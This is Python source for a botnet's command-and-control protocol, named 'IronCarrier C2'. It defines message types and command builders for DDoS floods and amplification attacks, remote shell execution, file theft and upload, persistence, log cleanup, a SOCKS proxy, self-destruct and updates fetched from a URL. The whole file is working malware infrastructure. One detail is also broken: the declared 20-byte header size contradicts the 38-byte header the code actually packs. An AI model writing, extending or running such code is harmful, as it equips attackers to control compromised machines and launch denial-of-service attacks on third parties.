#!/usr/bin/env python3
"""
C2 Protocol
Message framing, command types, and serialization
"""

import struct
import json
import time
import uuid
from typing import Dict, Any, Optional, List
from enum import IntEnum
from dataclasses import dataclass, field


class MessageType(IntEnum):
    # Handshake
    HELLO = 0x01
    KEY_EXCHANGE = 0x02
    KEY_EXCHANGE_RESP = 0x03
    AUTHENTICATE = 0x04
    
    # Heartbeat
    PING = 0x10
    PONG = 0x11
    HEARTBEAT = 0x12
    
    # Commands
    COMMAND = 0x20
    COMMAND_RESULT = 0x21
    COMMAND_ERROR = 0x22
    
    # Data
    DATA_UPLOAD = 0x30
    DATA_DOWNLOAD = 0x31
    DATA_CHUNK = 0x32
    
    # Attack
    ATTACK_START = 0x40
    ATTACK_STOP = 0x41
    ATTACK_STATUS = 0x42
    ATTACK_STATS = 0x43
    
    # System
    SYSTEM_INFO = 0x50
    SHELL_COMMAND = 0x51
    SHELL_OUTPUT = 0x52
    FILE_LIST = 0x53
    FILE_READ = 0x54
    FILE_WRITE = 0x55
    
    # Control
    DISCONNECT = 0xF0
    RECONNECT = 0xF1
    UPDATE = 0xF2
    SELF_DESTRUCT = 0xFF


class CommandType(IntEnum):
    # Recon
    PORT_SCAN = 0x01
    SUBNET_SCAN = 0x02
    SERVICE_DETECT = 0x03
    VULN_SCAN = 0x04
    
    # Attacks
    TCP_FLOOD = 0x10
    UDP_FLOOD = 0x11
    SYN_FLOOD = 0x12
    HTTP_FLOOD = 0x13
    SLOWLORIS = 0x14
    DNS_AMP = 0x15
    NTP_AMP = 0x16
    MEMCACHED_AMP = 0x17
    
    # System
    SHELL = 0x20
    DOWNLOAD = 0x21
    UPLOAD = 0x22
    EXECUTE = 0x23
    PERSIST = 0x24
    CLEANUP = 0x25
    
    # Proxy
    START_SOCKS = 0x30
    STOP_SOCKS = 0x31
    
    # Misc
    CUSTOM = 0xFF


class MessageFlags(IntEnum):
    ENCRYPTED = 0x01
    COMPRESSED = 0x02
    FRAGMENTED = 0x04
    PRIORITY_HIGH = 0x08
    PRIORITY_LOW = 0x10
    NO_REPLY = 0x20
    BROADCAST = 0x40


@dataclass
class C2Message:
    """C2 protocol message"""
    msg_type: MessageType
    msg_id: str = field(default_factory=lambda: uuid.uuid4().hex[:16])
    timestamp: float = field(default_factory=time.time)
    flags: int = 0
    payload: bytes = b''
    metadata: Dict[str, Any] = field(default_factory=dict)
    
    # For fragments
    fragment_index: int = 0
    fragment_total: int = 1
    original_msg_id: str = ''
    
    def to_dict(self) -> Dict:
        return {
            'type': self.msg_type.name,
            'id': self.msg_id,
            'ts': self.timestamp,
            'flags': self.flags,
            'meta': self.metadata,
            'frag_index': self.fragment_index,
            'frag_total': self.fragment_total,
            'orig_id': self.original_msg_id,
        }
    
    def to_json(self) -> bytes:
        return json.dumps(self.to_dict()).encode()
    
    @classmethod
    def from_dict(cls, data: Dict) -> 'C2Message':
        return cls(
            msg_type=MessageType[data['type']],
            msg_id=data.get('id', uuid.uuid4().hex[:16]),
            timestamp=data.get('ts', time.time()),
            flags=data.get('flags', 0),
            metadata=data.get('meta', {}),
            fragment_index=data.get('frag_index', 0),
            fragment_total=data.get('frag_total', 1),
            original_msg_id=data.get('orig_id', ''),
        )
    
    @classmethod
    def from_json(cls, data: bytes) -> 'C2Message':
        return cls.from_dict(json.loads(data.decode()))


class ProtocolEncoder:
    """Encode/decode C2 protocol frames"""
    
    MAGIC = b'\x1C\xC2\x00\x01'  # IronCarrier C2 v1
    HEADER_SIZE = 20
    MAX_FRAME_SIZE = 16 * 1024 * 1024  # 16MB
    MAX_PAYLOAD_SIZE = MAX_FRAME_SIZE - HEADER_SIZE
    
    @staticmethod
    def encode(message: C2Message) -> bytes:
        """Encode message to wire format"""
        payload = message.payload
        metadata_json = json.dumps(message.metadata).encode() if message.metadata else b'{}'
        
        # Header: MAGIC(4) + TYPE(1) + FLAGS(1) + MSG_ID(16) + TIMESTAMP(8) + META_LEN(4) + PAYLOAD_LEN(4) = 38
        header = (
            ProtocolEncoder.MAGIC +
            struct.pack('!B', message.msg_type) +
            struct.pack('!B', message.flags) +
            message.msg_id.encode()[:16].ljust(16, b'\x00') +
            struct.pack('!d', message.timestamp) +
            struct.pack('!I', len(metadata_json)) +
            struct.pack('!I', len(payload))
        )
        
        frame = header + metadata_json + payload
        
        if len(frame) > ProtocolEncoder.MAX_FRAME_SIZE:
            # Need fragmentation
            return ProtocolEncoder._fragment(message, payload)
        
        return frame
    
    @staticmethod
    def _fragment(message: C2Message, payload: bytes) -> bytes:
        """Fragment large message into multiple frames"""
        chunk_size = ProtocolEncoder.MAX_PAYLOAD_SIZE - 256  # Leave room for metadata
        chunks = [payload[i:i + chunk_size] for i in range(0, len(payload), chunk_size)]
        
        frames = b''
        for i, chunk in enumerate(chunks):
            frag_msg = C2Message(
                msg_type=message.msg_type,
                msg_id=message.msg_id,
                timestamp=message.timestamp,
                flags=message.flags | MessageFlags.FRAGMENTED,
                metadata=message.metadata,
                payload=chunk,
                fragment_index=i,
                fragment_total=len(chunks),
                original_msg_id=message.msg_id,
            )
            frames += ProtocolEncoder.encode(frag_msg)
        
        return frames
    
    @staticmethod
    def decode(data: bytes) -> Optional[C2Message]:
        """Decode wire format to message"""
        if len(data) < ProtocolEncoder.HEADER_SIZE:
            return None
        
        # Check magic
        if data[:4] != ProtocolEncoder.MAGIC:
            return None
        
        offset = 4
        
        msg_type = struct.unpack('!B', data[offset:offset + 1])[0]
        offset += 1
        
        flags = struct.unpack('!B', data[offset:offset + 1])[0]
        offset += 1
        
        msg_id = data[offset:offset + 16].rstrip(b'\x00').decode()
        offset += 16
        
        timestamp = struct.unpack('!d', data[offset:offset + 8])[0]
        offset += 8
        
        meta_len = struct.unpack('!I', data[offset:offset + 4])[0]
        offset += 4
        
        payload_len = struct.unpack('!I', data[offset:offset + 4])[0]
        offset += 4
        
        metadata = {}
        if meta_len > 0:
            try:
                metadata = json.loads(data[offset:offset + meta_len].decode())
            except Exception:
                pass
            offset += meta_len
        
        payload = data[offset:offset + payload_len] if payload_len > 0 else b''
        
        return C2Message(
            msg_type=MessageType(msg_type),
            msg_id=msg_id,
            timestamp=timestamp,
            flags=flags,
            payload=payload,
            metadata=metadata,
        )


class FragmentReassembler:
    """Reassemble fragmented messages"""
    
    def __init__(self, timeout: float = 60.0):
        self.timeout = timeout
        self._fragments: Dict[str, Dict[int, C2Message]] = {}
        self._timestamps: Dict[str, float] = {}
    
    def add(self, message: C2Message) -> Optional[C2Message]:
        """Add fragment, return complete message if all received"""
        if not (message.flags & MessageFlags.FRAGMENTED):
            return message
        
        orig_id = message.original_msg_id or message.msg_id
        
        if orig_id not in self._fragments:
            self._fragments[orig_id] = {}
            self._timestamps[orig_id] = time.time()
        
        self._fragments[orig_id][message.fragment_index] = message
        
        # Check if complete
        total = message.fragment_total
        if len(self._fragments[orig_id]) == total:
            # Reassemble
            fragments = self._fragments.pop(orig_id)
            self._timestamps.pop(orig_id, None)
            
            payload = b''
            for i in range(total):
                payload += fragments[i].payload
            
            complete = C2Message(
                msg_type=message.msg_type,
                msg_id=orig_id,
                timestamp=message.timestamp,
                flags=message.flags & ~MessageFlags.FRAGMENTED,
                payload=payload,
                metadata=message.metadata,
            )
            return complete
        
        return None
    
    def cleanup(self) -> int:
        """Remove expired fragments"""
        now = time.time()
        expired = [mid for mid, ts in self._timestamps.items() if now - ts > self.timeout]
        for mid in expired:
            self._fragments.pop(mid, None)
            self._timestamps.pop(mid, None)
        return len(expired)


class CommandBuilder:
    """Build common C2 commands"""
    
    @staticmethod
    def attack_start(vector: str, target: str, port: int, duration: int,
                     threads: int = 100, **kwargs) -> C2Message:
        return C2Message(
            msg_type=MessageType.ATTACK_START,
            metadata={
                'vector': vector,
                'target': target,
                'port': port,
                'duration': duration,
                'threads': threads,
                **kwargs
            }
        )
    
    @staticmethod
    def attack_stop(job_id: str = '') -> C2Message:
        return C2Message(
            msg_type=MessageType.ATTACK_STOP,
            metadata={'job_id': job_id}
        )
    
    @staticmethod
    def shell_command(cmd: str, timeout: int = 30) -> C2Message:
        return C2Message(
            msg_type=MessageType.SHELL_COMMAND,
            metadata={'command': cmd, 'timeout': timeout}
        )
    
    @staticmethod
    def download_file(path: str) -> C2Message:
        return C2Message(
            msg_type=MessageType.DATA_DOWNLOAD,
            metadata={'path': path}
        )
    
    @staticmethod
    def upload_file(path: str, data: bytes) -> C2Message:
        return C2Message(
            msg_type=MessageType.DATA_UPLOAD,
            payload=data,
            metadata={'path': path}
        )
    
    @staticmethod
    def system_info() -> C2Message:
        return C2Message(msg_type=MessageType.SYSTEM_INFO)
    
    @staticmethod
    def ping() -> C2Message:
        return C2Message(msg_type=MessageType.PING)
    
    @staticmethod
    def persist(method: str = 'systemd', **kwargs) -> C2Message:
        return C2Message(
            msg_type=MessageType.COMMAND,
            metadata={'cmd': CommandType.PERSIST, 'method': method, **kwargs}
        )
    
    @staticmethod
    def cleanup() -> C2Message:
        return C2Message(
            msg_type=MessageType.COMMAND,
            metadata={'cmd': CommandType.CLEANUP}
        )
    
    @staticmethod
    def self_destruct(delay: int = 0) -> C2Message:
        return C2Message(
            msg_type=MessageType.SELF_DESTRUCT,
            metadata={'delay': delay}
        )
    
    @staticmethod
    def update(url: str) -> C2Message:
        return C2Message(
            msg_type=MessageType.UPDATE,
            metadata={'url': url}
        )
    
    @staticmethod
    def disconnect() -> C2Message:
        return C2Message(msg_type=MessageType.DISCONNECT)
